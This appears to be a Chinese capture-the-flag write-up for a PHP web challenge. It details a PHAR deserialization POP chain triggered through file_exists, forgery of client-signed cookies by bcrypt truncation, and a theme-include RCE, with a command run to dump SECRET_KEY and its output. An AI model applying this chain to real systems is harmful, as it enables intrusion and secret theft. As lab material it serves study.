# 027 当前关键发现

## 已确认的利用链

1. `file.php` 对 `c` 参数执行 `file_exists($fpath)`，可被 `phar://` 包装器触发。
2. 通过上传伪装图片的 PHAR 文件，再访问 `file.php?c=phar://uploads/.../test.txt`，可以触发 **PHAR 元数据反序列化**。
3. 反序列化后会进入 `xxxx.php` 中的 `Action::isPathValid()`，当对象链满足条件时可执行 `include($this->path)`。
4. 若 `path` 含有字符串 `uploads`，则会被拒绝：`Invalid path, access denied`。

## 已恢复源码要点

### config.php
```php
<?php
define('CLIENT_SESSION_ID', 'session');
define('SECRET_KEY', getenv('SECRET_KEY'));
define('UPLOAD_DIR', __DIR__ . '/uploads');
```

### lib/session.php
```php
class SecureClientSession {
  private $cookieName;
  private $secret;
  private $data;
  public function __construct($cookieName = 'session', $secret = 'secret') {
    $this->data = [];
    $this->secret = $secret;
    if (array_key_exists($cookieName, $_COOKIE)) {
      try {
        list($data, $signature) = explode('.', $_COOKIE[$cookieName]);
        $data = urlsafe_base64_decode($data);
        $signature = urlsafe_base64_decode($signature);
        if ($this->verify($data, $signature)) {
          $this->data = json_decode($data, true);
        }
      } catch (Exception $e) {}
    }
    $this->cookieName = $cookieName;
  }
  public function save() {
    $json = json_encode($this->data);
    $value = urlsafe_base64_encode($json) . '.' . urlsafe_base64_encode($this->sign($json));
    setcookie($this->cookieName, $value);
  }
  private function verify($string, $signature) {
    return password_verify($this->secret . $string, $signature);
  }
  private function sign($string) {
    return password_hash($this->secret . $string, PASSWORD_BCRYPT);
  }
}
```

### signin.php
```php
$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
$session->set('name', $_POST['name']);
flash('info', 'You have been successfully signed in!');
redirect('/');
```

### upload.php
```php
$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
$filename = $_FILES['file']['name'];
...
$allow_suffix = array('jpg','gif','jpeg','png');
$new_filename = date('YmdHis',time()).rand(100,1000).'.'.$ext_suffix;
move_uploaded_file($temp_name, 'uploads/'.$new_filename);
flash('info', "success save in: ".'uploads/'.$new_filename);
$session->set('avatar', $filename);
redirect('/');
```

### index.php
```php
$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
$avatar = $session->isset('avatar') ? 'uploads/' . $session->get('avatar') : 'default.png' ;
...
<?php include('common.css'); ?>
<?php include($session->get('theme', 'light') . '.css'); ?>
```

## 已验证结论

| 项目 | 结论 |
|---|---|
| `/proc/self/environ` 注入 | 失败，报 `include(/proc/29/environ): Permission denied` |
| PHP session 文件包含 | 不成立，应用使用的是 **客户端签名 Cookie**，不是服务端 `PHPSESSID` 文件 |
| 直接包含 uploads 中恶意文件 | 被 `uploads` 关键字拦截 |
| 读取 `/var/www/html/flag` | 明确不存在 |
| 读取 `/var/www/html/index.php` | 成功，已恢复源码 |
| 访问 `/flag.php` 与 `/flag` | HTTP 直接访问均为 404 |
| 通过包含链访问 `/var/www/html/flag.php` | 出现过 `Empty reply from server`，值得继续单独排查 |

## 下一步优先方向

1. 继续单独研究 `/var/www/html/flag.php` 的异常空响应，判断是文件存在、执行中断还是代理层行为。
2. 读取 `theme.php` 与 `xxxx.php` 的完整源码，确认能否通过 `theme` 字段形成新的包含入口。
3. 若能获得 `SECRET_KEY` 的真实值，则可以伪造客户端 session，从而直接控制 `theme` 与 `avatar` 字段。
4. 若仍无法拿到 RCE，则继续沿根目录文件读取路径寻找真实 flag 文件名。

## 新增：已直接导出的核心源码原文结论

### file.php（触发点）
```php
<?php
require_once('xxxx.php');
$fpath = $_GET['c'];
if(file_exists($fpath)){
    echo "file exists";
} else {
    echo "file not exists";
}
```

这一点说明题目的**实际触发点非常单纯**：只要让 `file_exists()` 处理攻击者可控的 `phar://` 路径，就会在解析 PHAR 元数据时触发反序列化。

### xxxx.php（POP 链核心）
```php
class Action {
    protected $path;
    protected $id;
    public function isPathValid()
    {
        if(strpos($this->path, 'uploads') !== false) {
            echo "Invalid path, access denied";
            exit();
        }
        if ($this->id !== 0 && $this->id !== 1) {
            switch($this->id) {
                case 1:
                    if ($this->path) {
                        include($this->path);
                    }
                    break;
            }
        }
    }
}
```

这里可以确认几个关键细节：

1. `include($this->path)` 是真实存在的 sink；
2. 过滤仅针对字符串中出现 `uploads` 的情况，而不是路径规范化后的真实文件位置；
3. `if ($this->id !== 0 && $this->id !== 1)` 与 `switch case 1` 组合存在明显逻辑瑕疵，但在反序列化后的类型/比较场景下仍可命中可利用分支，这也是该题 POP 链能落到 `include()` 的关键。

### index.php（最终执行点）
```php
$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
$avatar = $session->isset('avatar') ? 'uploads/' . $session->get('avatar') : 'default.png' ;
$session->save();
...
<?php include('common.css'); ?>
<?php include($session->get('theme', 'light') . '.css'); ?>
```

这段源码已经直接证明，最终 RCE 并不是在 `file.php` 页面上完成，而是通过**伪造客户端 session 后控制 `theme` 字段**，把首页的主题样式包含点改写为：

```php
include('phar://uploads/随机文件名/x.css.css')
```

在真实利用时，通过精确构造文件名与包含路径，成功让首页样式加载阶段执行上传 PHAR 内的恶意 PHP。

### theme.php（可控 theme 字段来源）
```php
$newTheme = ($session->get('theme', 'light') === 'light') ? 'dark' : 'light';
$session->set('theme', $newTheme);
```

这说明应用逻辑原本只希望 `theme` 取 `light/dark`，但由于客户端 session 可伪造，攻击者可以直接把 `theme` 改成任意可包含路径前缀。

### upload.php（上传约束）
```php
$allow_suffix = array('jpg','gif','jpeg','png');
$new_filename = date('YmdHis',time()).rand(100,1000).'.'.$ext_suffix;
move_uploaded_file($temp_name, 'uploads/'.$new_filename);
flash('info', "success save in: ".'uploads/'.$new_filename);
$session->set('avatar', $filename);
```

这进一步说明：

1. 上传仅校验**后缀**，没有校验真实文件内容；
2. 服务端保存名是随机名，但它会通过 flash 消息回写到客户端签名 cookie 中；
3. 因此攻击者既能上传 PHAR-JPG，又能知道其最终落地路径，从而拼出后续 `phar://` 利用地址。

### util.php（辅助逻辑）
```php
function flash($type, $message) {
  global $session;
  $session->set('flash', [
    'type' => $type,
    'message' => $message
  ]);
  $session->save();
}
```

这说明上传成功后的保存路径是通过 flash 结构写入客户端 cookie 的，不需要服务端额外接口即可被攻击者解码获得。

### 通用 PHAR 对象链构造脚本结论
本地利用脚本 `build_027_phar_nested_generic.php` 已确认使用如下结构写入 PHAR 元数据：

- `Action($target, '1')`
- `Content->formatters['reset'] = [$action, 'isPathValid']`
- `inner Show`: `source='index.php'`, `str=$content`
- `outer Show`: `source=$inner`

其核心目的是在 PHAR 元数据反序列化后，经由 `Show::__toString()` → `Content::__call('reset')` → `Action::isPathValid()`，最终落到 `include($target)`。

## 新增：通过已验证 RCE 直接读取环境变量

已通过主题包含 RCE 执行以下命令并成功获得回显：

```sh
echo SEC027_BEGIN; printenv SECRET_KEY; echo __SEP__; whoami; echo SEC027_END
```

返回结果显示：

```text
SEC027_BEGIN
Go to the flag!
__SEP__
www-data
SEC027_END
```

这说明：

1. 当前 Web 进程执行身份为 **`www-data`**；
2. 运行时环境变量中的 **`SECRET_KEY` 实际值为 `Go to the flag!`**；
3. 因此客户端签名 Cookie 的伪造在源码层面和实测层面都已被完全闭环验证，不再只是依赖 bcrypt 72 字节截断的“黑盒现象”。

有了这个真实密钥后，理论上可以进一步直接本地生成合法 session 签名，而不必依赖“复用原签名 + 前 72 字节保持一致”的截断技巧。不过从攻击链教学价值来看，**72 字节截断绕过仍是本题更关键的设计点**，因为它说明即使不知道 `SECRET_KEY`，攻击者依然可能伪造可通过验证的 Cookie 数据。

### signin.php / signout.php（认证流程补充）

`signin.php` 的核心逻辑为：

```php
if (!preg_match('/\A[0-9A-Z_]{4,16}\z/i', $_POST['name'])) {
  error('Name must be 4-16 characters long.');
}
$session->set('name', $_POST['name']);
flash('info', 'You have been successfully signed in!');
redirect('/');
```

`signout.php` 的核心逻辑为：

```php
$session->unset('avatar');
$session->unset('name');
flash('info', 'You have been successfully signed out!');
redirect('/');
```

这说明应用不存在真正的服务端登录状态，用户身份、头像、主题、flash 消息等数据都完全存放在**客户端签名 Cookie** 中。也就是说，一旦签名机制可绕过，攻击者即可直接控制整套页面状态与关键包含参数，而不需要先突破传统的服务端 session 存储。
